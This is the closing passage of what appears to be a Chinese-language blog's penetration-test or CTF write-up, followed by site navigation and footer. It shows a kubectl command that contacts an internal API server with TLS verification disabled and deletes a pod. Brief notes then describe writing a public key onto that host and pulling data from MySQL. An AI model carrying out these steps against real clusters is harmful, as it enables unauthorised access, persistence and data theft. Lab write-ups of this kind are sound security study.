+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">kubectl --server=https://172.22.14.37:6443 --insecure-skip-tls-verify delete pod pod -n default
+</span></span></code></pre></div></div><p>然后写公钥到 172.22.14.37里去</p>
+<p>之后上mysql直接拿</p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/flarum" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Flarum</p>
+            </a>
+            
+
+            
+            <a href="/post/hospital" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">Hospital</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
